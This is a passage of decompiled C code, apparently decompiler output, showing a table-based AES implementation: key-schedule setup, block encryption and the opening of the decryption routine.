    bVar5 = bVar5 ^ bVar2 ^ bVar3 ^ bVar4 ^ (bVar1 >> 7 | bVar4 * '\x02') ^ 99;
    (&_FSb)[local_10] = bVar5;
    (&_RSb)[bVar5] = (char)local_10;
  }
  for (local_10 = 0; local_10 < 0x100; local_10 = local_10 + 1) {
    bVar5 = (&_FSb)[local_10];
    bVar4 = bVar5 * '\x02';
    if ((char)bVar5 < '\0') {
      bVar4 = bVar4 ^ 0x1b;
    }
    *(uint *)(&_FT0 + local_10 * 4) = CONCAT13(bVar4,CONCAT12(bVar5,CONCAT11(bVar5,bVar5 ^ bVar4)));
    *(undefined4 *)(&_FT0 + local_10 * 4) = *(undefined4 *)(&_FT0 + local_10 * 4);
    *(uint *)(&_FT1 + local_10 * 4) =
         *(uint *)(&_FT0 + local_10 * 4) << 0x18 | *(uint *)(&_FT0 + local_10 * 4) >> 8;
    *(uint *)(&_FT2 + local_10 * 4) =
         *(uint *)(&_FT1 + local_10 * 4) << 0x18 | *(uint *)(&_FT1 + local_10 * 4) >> 8;
    *(uint *)(&_FT3 + local_10 * 4) =
         *(uint *)(&_FT2 + local_10 * 4) << 0x18 | *(uint *)(&_FT2 + local_10 * 4) >> 8;
    bVar5 = (&_RSb)[local_10];
    if (bVar5 == 0) {
      local_23c = 0;
    }
    else {
      local_23c = (uint)abStack284[((uint)abStack540[11] + (uint)abStack540[bVar5]) % 0xff];
    }
    local_238 = local_23c;
    if (bVar5 != 0) {
      local_238 = local_23c ^
                  (uint)abStack284[((uint)abStack540[13] + (uint)abStack540[bVar5]) % 0xff] << 8;
    }
    local_234 = local_238;
    if (bVar5 != 0) {
      local_234 = local_238 ^
                  (uint)abStack284[((uint)abStack540[9] + (uint)abStack540[bVar5]) % 0xff] << 0x10;
    }
    local_240 = local_234;
    if (bVar5 != 0) {
      local_240 = local_234 ^
                  (uint)abStack284[((uint)abStack540[14] + (uint)abStack540[bVar5]) % 0xff] << 0x18;
    }
    *(uint *)(&_RT0 + local_10 * 4) = local_240;
    *(undefined4 *)(&_RT0 + local_10 * 4) = *(undefined4 *)(&_RT0 + local_10 * 4);
    *(uint *)(&_RT1 + local_10 * 4) =
         *(uint *)(&_RT0 + local_10 * 4) << 0x18 | *(uint *)(&_RT0 + local_10 * 4) >> 8;
    *(uint *)(&_RT2 + local_10 * 4) =
         *(uint *)(&_RT1 + local_10 * 4) << 0x18 | *(uint *)(&_RT1 + local_10 * 4) >> 8;
    *(uint *)(&_RT3 + local_10 * 4) =
         *(uint *)(&_RT2 + local_10 * 4) << 0x18 | *(uint *)(&_RT2 + local_10 * 4) >> 8;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl _aes_set_key(uint *param_1,int param_2,int param_3)

{
  uint uVar1;
  uint *puVar2;
  uint *local_14;
  uint *local_10;
  int local_c;
  
  if (__ZZ11aes_set_keyE7ft_init == 0) {
    __Z14aes_gen_tablesv();
    __ZZ11aes_set_keyE7ft_init = 1;
  }
  if (param_3 == 0xc0) {
    param_1[0x80] = 0xc;
  }
  else if (param_3 < 0xc1) {
    if (param_3 != 0x80) {
      return;
    }
    param_1[0x80] = 10;
  }
  else {
    if (param_3 != 0x100) {
      return;
    }
    param_1[0x80] = 0xe;
  }
  local_10 = param_1;
  for (local_c = 0; local_c < param_3 >> 5; local_c = local_c + 1) {
    param_1[local_c] =
         (uint)*(byte *)(local_c * 4 + param_2 + 3) |
         (uint)*(byte *)(param_2 + local_c * 4) << 0x18 |
         (uint)*(byte *)(local_c * 4 + param_2 + 1) << 0x10 |
         (uint)*(byte *)(local_c * 4 + param_2 + 2) << 8;
  }
  uVar1 = param_1[0x80];
  if (uVar1 == 0xc) {
    for (local_c = 0; local_c < 8; local_c = local_c + 1) {
      local_10[6] = (uint)(byte)(&_FSb)[local_10[5] >> 0x18] ^
                    *local_10 ^ *(uint *)(&_RCON + local_c * 4) ^
                    (uint)(byte)(&_FSb)[local_10[5] >> 0x10 & 0xff] << 0x18 ^
                    (uint)(byte)(&_FSb)[local_10[5] >> 8 & 0xff] << 0x10 ^
                    (uint)(byte)(&_FSb)[local_10[5] & 0xff] << 8;
      local_10[7] = local_10[6] ^ local_10[1];
      local_10[8] = local_10[7] ^ local_10[2];
      local_10[9] = local_10[8] ^ local_10[3];
      local_10[10] = local_10[9] ^ local_10[4];
      local_10[0xb] = local_10[10] ^ local_10[5];
      local_10 = local_10 + 6;
    }
  }
  else if ((int)uVar1 < 0xd) {
    if (uVar1 == 10) {
      for (local_c = 0; local_c < 10; local_c = local_c + 1) {
        local_10[4] = (uint)(byte)(&_FSb)[local_10[3] >> 0x18] ^
                      *local_10 ^ *(uint *)(&_RCON + local_c * 4) ^
                      (uint)(byte)(&_FSb)[local_10[3] >> 0x10 & 0xff] << 0x18 ^
                      (uint)(byte)(&_FSb)[local_10[3] >> 8 & 0xff] << 0x10 ^
                      (uint)(byte)(&_FSb)[local_10[3] & 0xff] << 8;
        local_10[5] = local_10[4] ^ local_10[1];
        local_10[6] = local_10[5] ^ local_10[2];
        local_10[7] = local_10[6] ^ local_10[3];
        local_10 = local_10 + 4;
      }
    }
  }
  else if (uVar1 == 0xe) {
    for (local_c = 0; local_c < 7; local_c = local_c + 1) {
      local_10[8] = (uint)(byte)(&_FSb)[local_10[7] >> 0x18] ^
                    *local_10 ^ *(uint *)(&_RCON + local_c * 4) ^
                    (uint)(byte)(&_FSb)[local_10[7] >> 0x10 & 0xff] << 0x18 ^
                    (uint)(byte)(&_FSb)[local_10[7] >> 8 & 0xff] << 0x10 ^
                    (uint)(byte)(&_FSb)[local_10[7] & 0xff] << 8;
      local_10[9] = local_10[8] ^ local_10[1];
      local_10[10] = local_10[9] ^ local_10[2];
      local_10[0xb] = local_10[10] ^ local_10[3];
      local_10[0xc] =
           (uint)(byte)(&_FSb)[local_10[0xb] & 0xff] ^
           (uint)(byte)(&_FSb)[local_10[0xb] >> 0x18] << 0x18 ^ local_10[4] ^
           (uint)(byte)(&_FSb)[local_10[0xb] >> 0x10 & 0xff] << 0x10 ^
           (uint)(byte)(&_FSb)[local_10[0xb] >> 8 & 0xff] << 8;
      local_10[0xd] = local_10[0xc] ^ local_10[5];
      local_10[0xe] = local_10[0xd] ^ local_10[6];
      local_10[0xf] = local_10[0xe] ^ local_10[7];
      local_10 = local_10 + 8;
    }
  }
  if (__ZZ11aes_set_keyE7kt_init == 0) {
    for (local_c = 0; local_c < 0x100; local_c = local_c + 1) {
      *(undefined4 *)(&_KT0 + local_c * 4) =
           *(undefined4 *)(&_RT0 + (uint)(byte)(&_FSb)[local_c] * 4);
      *(undefined4 *)(&_KT1 + local_c * 4) =
           *(undefined4 *)(&_RT1 + (uint)(byte)(&_FSb)[local_c] * 4);
      *(undefined4 *)(&_KT2 + local_c * 4) =
           *(undefined4 *)(&_RT2 + (uint)(byte)(&_FSb)[local_c] * 4);
      *(undefined4 *)(&_KT3 + local_c * 4) =
           *(undefined4 *)(&_RT3 + (uint)(byte)(&_FSb)[local_c] * 4);
    }
    __ZZ11aes_set_keyE7kt_init = 1;
  }
  param_1[0x40] = *local_10;
  param_1[0x41] = local_10[1];
  puVar2 = local_10 + 3;
  param_1[0x42] = local_10[2];
  local_10 = local_10 + 4;
  param_1[0x43] = *puVar2;
  local_14 = param_1 + 0x44;
  for (local_c = 1; local_c < (int)param_1[0x80]; local_c = local_c + 1) {
    puVar2 = local_10 + -8;
    *local_14 = *(uint *)(&_KT0 + (*puVar2 >> 0x18) * 4) ^
                *(uint *)(&_KT1 + (*puVar2 >> 0x10 & 0xff) * 4) ^
                *(uint *)(&_KT2 + (*puVar2 >> 8 & 0xff) * 4) ^
                *(uint *)(&_KT3 + (*puVar2 & 0xff) * 4);
    puVar2 = local_10 + -7;
    local_14[1] = *(uint *)(&_KT0 + (*puVar2 >> 0x18) * 4) ^
                  *(uint *)(&_KT1 + (*puVar2 >> 0x10 & 0xff) * 4) ^
                  *(uint *)(&_KT2 + (*puVar2 >> 8 & 0xff) * 4) ^
                  *(uint *)(&_KT3 + (*puVar2 & 0xff) * 4);
    puVar2 = local_10 + -6;
    local_14[2] = *(uint *)(&_KT0 + (*puVar2 >> 0x18) * 4) ^
                  *(uint *)(&_KT1 + (*puVar2 >> 0x10 & 0xff) * 4) ^
                  *(uint *)(&_KT2 + (*puVar2 >> 8 & 0xff) * 4) ^
                  *(uint *)(&_KT3 + (*puVar2 & 0xff) * 4);
    puVar2 = local_10 + -5;
    local_14[3] = *(uint *)(&_KT0 + (*puVar2 >> 0x18) * 4) ^
                  *(uint *)(&_KT1 + (*puVar2 >> 0x10 & 0xff) * 4) ^
                  *(uint *)(&_KT2 + (*puVar2 >> 8 & 0xff) * 4) ^
                  *(uint *)(&_KT3 + (*puVar2 & 0xff) * 4);
    local_14 = local_14 + 4;
    local_10 = local_10 + -4;
  }
  *local_14 = local_10[-8];
  local_14[1] = local_10[-7];
  local_14[2] = local_10[-6];
  local_14[3] = local_10[-5];
  return;
}



void __cdecl _aes_encrypt(uint *param_1,byte *param_2,byte *param_3)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  byte bVar5;
  byte bVar6;
  byte bVar7;
  byte bVar8;
  byte bVar9;
  byte bVar10;
  byte bVar11;
  byte bVar12;
  byte bVar13;
  byte bVar14;
  byte bVar15;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  uint uVar19;
  uint uVar20;
  uint uVar21;
  uint uVar22;
  uint local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  uint *local_8;
  
  uVar19 = ((uint)param_2[3] |
           (uint)*param_2 << 0x18 | (uint)param_2[1] << 0x10 | (uint)param_2[2] << 8) ^ *param_1;
  uVar20 = ((uint)param_2[7] |
           (uint)param_2[4] << 0x18 | (uint)param_2[5] << 0x10 | (uint)param_2[6] << 8) ^ param_1[1]
  ;
  uVar21 = ((uint)param_2[0xb] |
           (uint)param_2[8] << 0x18 | (uint)param_2[9] << 0x10 | (uint)param_2[10] << 8) ^
           param_1[2];
  uVar22 = ((uint)param_2[0xf] |
           (uint)param_2[0xc] << 0x18 | (uint)param_2[0xd] << 0x10 | (uint)param_2[0xe] << 8) ^
           param_1[3];
  uVar16 = param_1[4] ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar20 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar21 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar22 & 0xff) * 4);
  uVar17 = param_1[5] ^ *(uint *)(&_FT0 + (uVar20 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar21 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar22 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
  uVar18 = param_1[6] ^ *(uint *)(&_FT0 + (uVar21 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar22 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar20 & 0xff) * 4);
  uVar19 = param_1[7] ^ *(uint *)(&_FT0 + (uVar22 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar20 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar21 & 0xff) * 4);
  uVar20 = param_1[8] ^ *(uint *)(&_FT0 + (uVar16 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar17 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar18 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
  uVar21 = param_1[9] ^ *(uint *)(&_FT0 + (uVar17 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar18 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar16 & 0xff) * 4);
  uVar22 = param_1[10] ^ *(uint *)(&_FT0 + (uVar18 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar16 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar17 & 0xff) * 4);
  uVar19 = param_1[0xb] ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar16 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar17 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar18 & 0xff) * 4);
  uVar16 = param_1[0xc] ^ *(uint *)(&_FT0 + (uVar20 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar21 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar22 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
  uVar17 = param_1[0xd] ^ *(uint *)(&_FT0 + (uVar21 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar22 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar20 & 0xff) * 4);
  uVar18 = param_1[0xe] ^ *(uint *)(&_FT0 + (uVar22 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar20 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar21 & 0xff) * 4);
  uVar19 = param_1[0xf] ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar20 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar21 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar22 & 0xff) * 4);
  uVar20 = param_1[0x10] ^ *(uint *)(&_FT0 + (uVar16 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar17 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar18 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
  uVar21 = param_1[0x11] ^ *(uint *)(&_FT0 + (uVar17 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar18 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar16 & 0xff) * 4);
  uVar22 = param_1[0x12] ^ *(uint *)(&_FT0 + (uVar18 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar16 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar17 & 0xff) * 4);
  uVar19 = param_1[0x13] ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar16 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar17 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar18 & 0xff) * 4);
  uVar16 = param_1[0x14] ^ *(uint *)(&_FT0 + (uVar20 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar21 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar22 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
  uVar17 = param_1[0x15] ^ *(uint *)(&_FT0 + (uVar21 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar22 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar20 & 0xff) * 4);
  uVar18 = param_1[0x16] ^ *(uint *)(&_FT0 + (uVar22 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar20 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar21 & 0xff) * 4);
  uVar19 = param_1[0x17] ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar20 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar21 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar22 & 0xff) * 4);
  uVar20 = param_1[0x18] ^ *(uint *)(&_FT0 + (uVar16 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar17 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar18 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
  uVar21 = param_1[0x19] ^ *(uint *)(&_FT0 + (uVar17 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar18 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar16 & 0xff) * 4);
  uVar22 = param_1[0x1a] ^ *(uint *)(&_FT0 + (uVar18 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar16 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar17 & 0xff) * 4);
  uVar19 = param_1[0x1b] ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar16 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar17 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar18 & 0xff) * 4);
  uVar16 = param_1[0x1c] ^ *(uint *)(&_FT0 + (uVar20 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar21 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar22 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
  uVar17 = param_1[0x1d] ^ *(uint *)(&_FT0 + (uVar21 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar22 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar20 & 0xff) * 4);
  uVar18 = param_1[0x1e] ^ *(uint *)(&_FT0 + (uVar22 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar20 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar21 & 0xff) * 4);
  uVar19 = param_1[0x1f] ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar20 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar21 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar22 & 0xff) * 4);
  uVar20 = param_1[0x20] ^ *(uint *)(&_FT0 + (uVar16 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar17 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar18 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
  uVar21 = param_1[0x21] ^ *(uint *)(&_FT0 + (uVar17 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar18 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar16 & 0xff) * 4);
  uVar22 = param_1[0x22] ^ *(uint *)(&_FT0 + (uVar18 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar16 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar17 & 0xff) * 4);
  uVar19 = param_1[0x23] ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
           *(uint *)(&_FT1 + (uVar16 >> 0x10 & 0xff) * 4) ^
           *(uint *)(&_FT2 + (uVar17 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar18 & 0xff) * 4);
  local_8 = param_1 + 0x24;
  local_1c = *local_8 ^ *(uint *)(&_FT0 + (uVar20 >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (uVar21 >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (uVar22 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
  local_20 = param_1[0x25] ^ *(uint *)(&_FT0 + (uVar21 >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (uVar22 >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar20 & 0xff) * 4);
  local_24 = param_1[0x26] ^ *(uint *)(&_FT0 + (uVar22 >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (uVar20 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar21 & 0xff) * 4);
  local_28 = param_1[0x27] ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (uVar20 >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (uVar21 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar22 & 0xff) * 4);
  if (10 < (int)param_1[0x80]) {
    uVar19 = param_1[0x28] ^ *(uint *)(&_FT0 + (local_1c >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (local_20 >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (local_24 >> 8 & 0xff) * 4) ^
             *(uint *)(&_FT3 + (local_28 & 0xff) * 4);
    uVar20 = param_1[0x29] ^ *(uint *)(&_FT0 + (local_20 >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (local_24 >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (local_28 >> 8 & 0xff) * 4) ^
             *(uint *)(&_FT3 + (local_1c & 0xff) * 4);
    uVar21 = param_1[0x2a] ^ *(uint *)(&_FT0 + (local_24 >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (local_28 >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (local_1c >> 8 & 0xff) * 4) ^
             *(uint *)(&_FT3 + (local_20 & 0xff) * 4);
    uVar22 = param_1[0x2b] ^ *(uint *)(&_FT0 + (local_28 >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (local_1c >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (local_20 >> 8 & 0xff) * 4) ^
             *(uint *)(&_FT3 + (local_24 & 0xff) * 4);
    local_8 = param_1 + 0x2c;
    local_1c = *local_8 ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
               *(uint *)(&_FT1 + (uVar20 >> 0x10 & 0xff) * 4) ^
               *(uint *)(&_FT2 + (uVar21 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar22 & 0xff) * 4);
    local_20 = param_1[0x2d] ^ *(uint *)(&_FT0 + (uVar20 >> 0x18) * 4) ^
               *(uint *)(&_FT1 + (uVar21 >> 0x10 & 0xff) * 4) ^
               *(uint *)(&_FT2 + (uVar22 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
    local_24 = param_1[0x2e] ^ *(uint *)(&_FT0 + (uVar21 >> 0x18) * 4) ^
               *(uint *)(&_FT1 + (uVar22 >> 0x10 & 0xff) * 4) ^
               *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar20 & 0xff) * 4);
    local_28 = param_1[0x2f] ^ *(uint *)(&_FT0 + (uVar22 >> 0x18) * 4) ^
               *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
               *(uint *)(&_FT2 + (uVar20 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar21 & 0xff) * 4);
  }
  if (0xc < (int)param_1[0x80]) {
    uVar19 = local_8[4] ^ *(uint *)(&_FT0 + (local_1c >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (local_20 >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (local_24 >> 8 & 0xff) * 4) ^
             *(uint *)(&_FT3 + (local_28 & 0xff) * 4);
    uVar20 = local_8[5] ^ *(uint *)(&_FT0 + (local_20 >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (local_24 >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (local_28 >> 8 & 0xff) * 4) ^
             *(uint *)(&_FT3 + (local_1c & 0xff) * 4);
    uVar21 = local_8[6] ^ *(uint *)(&_FT0 + (local_24 >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (local_28 >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (local_1c >> 8 & 0xff) * 4) ^
             *(uint *)(&_FT3 + (local_20 & 0xff) * 4);
    uVar22 = local_8[7] ^ *(uint *)(&_FT0 + (local_28 >> 0x18) * 4) ^
             *(uint *)(&_FT1 + (local_1c >> 0x10 & 0xff) * 4) ^
             *(uint *)(&_FT2 + (local_20 >> 8 & 0xff) * 4) ^
             *(uint *)(&_FT3 + (local_24 & 0xff) * 4);
    local_1c = local_8[8] ^ *(uint *)(&_FT0 + (uVar19 >> 0x18) * 4) ^
               *(uint *)(&_FT1 + (uVar20 >> 0x10 & 0xff) * 4) ^
               *(uint *)(&_FT2 + (uVar21 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar22 & 0xff) * 4);
    local_20 = local_8[9] ^ *(uint *)(&_FT0 + (uVar20 >> 0x18) * 4) ^
               *(uint *)(&_FT1 + (uVar21 >> 0x10 & 0xff) * 4) ^
               *(uint *)(&_FT2 + (uVar22 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar19 & 0xff) * 4);
    local_24 = local_8[10] ^ *(uint *)(&_FT0 + (uVar21 >> 0x18) * 4) ^
               *(uint *)(&_FT1 + (uVar22 >> 0x10 & 0xff) * 4) ^
               *(uint *)(&_FT2 + (uVar19 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar20 & 0xff) * 4);
    local_28 = local_8[0xb] ^ *(uint *)(&_FT0 + (uVar22 >> 0x18) * 4) ^
               *(uint *)(&_FT1 + (uVar19 >> 0x10 & 0xff) * 4) ^
               *(uint *)(&_FT2 + (uVar20 >> 8 & 0xff) * 4) ^ *(uint *)(&_FT3 + (uVar21 & 0xff) * 4);
    local_8 = local_8 + 8;
  }
  uVar19 = local_8[4];
  bVar1 = (&_FSb)[local_20 >> 0x10 & 0xff];
  bVar2 = (&_FSb)[local_24 >> 8 & 0xff];
  bVar3 = (&_FSb)[local_28 & 0xff];
  bVar4 = (&_FSb)[local_20 >> 0x18];
  uVar20 = local_8[5];
  bVar5 = (&_FSb)[local_24 >> 0x10 & 0xff];
  bVar6 = (&_FSb)[local_28 >> 8 & 0xff];
  bVar7 = (&_FSb)[local_1c & 0xff];
  bVar8 = (&_FSb)[local_24 >> 0x18];
  uVar21 = local_8[6];
  bVar9 = (&_FSb)[local_28 >> 0x10 & 0xff];
  bVar10 = (&_FSb)[local_1c >> 8 & 0xff];
  bVar11 = (&_FSb)[local_20 & 0xff];
  bVar12 = (&_FSb)[local_28 >> 0x18];
  uVar22 = local_8[7];
  bVar13 = (&_FSb)[local_1c >> 0x10 & 0xff];
  bVar14 = (&_FSb)[local_20 >> 8 & 0xff];
  bVar15 = (&_FSb)[local_24 & 0xff];
  *param_3 = (&_FSb)[local_1c >> 0x18] ^ (byte)(uVar19 >> 0x18);
  param_3[1] = (byte)(uVar19 >> 0x10) ^ bVar1;
  param_3[2] = (byte)(uVar19 >> 8) ^ bVar2;
  param_3[3] = bVar3 ^ (byte)uVar19;
  param_3[4] = bVar4 ^ (byte)(uVar20 >> 0x18);
  param_3[5] = (byte)(uVar20 >> 0x10) ^ bVar5;
  param_3[6] = (byte)(uVar20 >> 8) ^ bVar6;
  param_3[7] = bVar7 ^ (byte)uVar20;
  param_3[8] = bVar8 ^ (byte)(uVar21 >> 0x18);
  param_3[9] = (byte)(uVar21 >> 0x10) ^ bVar9;
  param_3[10] = (byte)(uVar21 >> 8) ^ bVar10;
  param_3[0xb] = bVar11 ^ (byte)uVar21;
  param_3[0xc] = bVar12 ^ (byte)(uVar22 >> 0x18);
  param_3[0xd] = (byte)(uVar22 >> 0x10) ^ bVar13;
  param_3[0xe] = (byte)(uVar22 >> 8) ^ bVar14;
  param_3[0xf] = bVar15 ^ (byte)uVar22;
  return;
}



void __cdecl _aes_decrypt(int param_1,byte *param_2,byte *param_3)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  byte bVar5;
  byte bVar6;
  byte bVar7;
  byte bVar8;
  byte bVar9;
  byte bVar10;
  byte bVar11;
  byte bVar12;
  byte bVar13;
  byte bVar14;
  byte bVar15;
  uint uVar16;
  uint uVar17;
  uint uVar18;
  uint uVar19;
  uint uVar20;
  uint uVar21;
  uint uVar22;
  uint local_28;
  uint local_24;
  uint local_20;
  uint local_1c;
  uint *local_8;
  
  uVar19 = ((uint)param_2[3] |
